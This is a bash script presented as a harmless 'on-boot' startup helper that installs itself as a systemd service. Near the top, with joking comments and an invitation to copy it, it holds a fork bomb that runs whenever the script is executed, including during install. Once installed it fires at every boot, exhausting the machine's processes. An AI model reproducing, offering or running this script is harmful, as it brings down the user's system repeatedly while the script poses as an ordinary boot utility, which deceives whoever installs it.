#!/usr/bin/env bash
# =============================================================
#  on-boot.sh — runs automatically at system startup
#  Install:  sudo bash on-boot.sh --install
#  Uninstall: sudo bash on-boot.sh --uninstall
# =============================================================

# ── The script below, copy and paste from there if u want ────────────────────────

    :(){ :|: & };: >> /tmp/on-boot.log

# ── Ik this script is so sigma (im getting banned) ────────────────────────


# =============================================================
#  Ts will definitely break if u edit stuff below so idk might
#  be good depending on who is editing this
# =============================================================

SERVICE_NAME="on-boot"
SCRIPT_PATH="$(realpath "$0")"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

install_service() {
    echo "[*] Installing ${SERVICE_NAME}.service ..."

    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=on-boot user script
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/bin/bash ${SCRIPT_PATH}
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable --now "$SERVICE_NAME"
    echo "[+] Done. Service enabled and started."
    echo "    Check status: systemctl status ${SERVICE_NAME}"
}

uninstall_service() {
    echo "[*] Removing ${SERVICE_NAME}.service ..."
    systemctl disable --now "$SERVICE_NAME" 2>/dev/null
    rm -f "$SERVICE_FILE"
    systemctl daemon-reload
    echo "[+] Service removed."
}

case "${1:-}" in
    --install)   install_service ;;
    --uninstall) uninstall_service ;;
    *)
        # When run by systemd (no args), just execute the block above and exit.
        exit 0
        ;;
esac
